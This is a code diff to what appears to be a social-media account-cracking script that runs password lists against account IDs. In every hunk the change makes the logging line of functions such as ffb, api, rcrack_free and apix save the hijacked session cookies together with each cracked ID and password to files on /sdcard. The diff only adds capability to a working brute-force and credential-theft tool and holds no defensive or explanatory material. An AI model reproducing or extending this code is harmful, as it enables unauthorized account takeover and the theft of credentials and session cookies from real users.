@@ -254,7 +254,7 @@ def ffb(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [SPY-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
@@ -298,7 +298,7 @@ def ffb1(ids,names,passlist):
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [SPY-OK] %s | %s'%(ids,pas))
                                 #cek_apk(session,coki)
-                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
@@ -338,7 +338,7 @@ def ffb3(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [SPY-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
@@ -380,7 +380,7 @@ def ffb4(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [SPY-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
@@ -453,7 +453,7 @@ def api(ids,names,passlist):
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         print(f'\r\r\033[1;32m [SPY-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/SPY-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open(f'/sdcard/SPY-OK.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
@@ -523,8 +523,8 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [SPY-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/SPY-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;32m [SPY-OK] '+ids+' | '+pas+'|'+kuki+'\033[1;97m')
+                                        open(f'/sdcard/SPY-OK.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
@@ -568,7 +568,7 @@ def ffb7(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [SPY-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
@@ -702,7 +702,7 @@ def rcrack_free(idf,pwv):
 				print('\n')
 				print('\033[1;92m[SPY-OK] '+idf+' | '+ps+'\033[0;97m')
 				cek_apk(coki)
-				open('ok.txt', 'a').write(idf+' | '+ps+'\n')
+				open('/sdcard/spy.txt', 'a').write(idf+'|'+ps+'|'+coki+'\n')
 				oks.append(idf)
 				break
 			elif 'checkpoint' in log_cookies:
@@ -771,7 +771,7 @@ def apix(ids,passlist):
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         print(f'\r\r\033[1;32m [SPY-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/SPY-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open(f'/sdcard/SPY-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
